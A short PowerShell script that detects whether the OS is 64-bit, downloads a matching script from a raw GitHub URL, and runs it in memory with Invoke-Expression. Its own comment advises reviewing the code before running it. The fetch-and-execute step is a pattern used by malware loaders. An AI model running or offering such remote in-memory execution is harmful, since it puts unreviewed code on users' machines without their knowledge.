<#
.SYNOPSIS
    Downloads and executes an architecture-specific PowerShell script from a remote URL.

.DESCRIPTION
    Uses .NET's Environment class to detect if the OS is 64-bit.
    Based on the architecture, it downloads either a 64-bit or 32-bit version of a remote script
    and executes it in-memory.

.NOTES
    Consider replacing Invoke-Expression with Invoke-Command or saving and reviewing the script
    before execution for better security.
#>

$scriptUrl = if ([Environment]::Is64BitOperatingSystem) {
    "https://raw.githubusercontent.com/dmoore44/Powershell/master/CR64bin.ps1"
} else {
    "https://raw.githubusercontent.com/dmoore44/Powershell/master/CR32bin.ps1"
}

try {
    Write-Verbose "Downloading script from: $scriptUrl"

    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($scriptUrl)

    if (-not [string]::IsNullOrWhiteSpace($scriptContent)) {
        Invoke-Expression $scriptContent
    } else {
        Write-Warning "Downloaded script is empty."
    }
} catch {
    Write-Error "Failed to download or execute the script: $_"
}
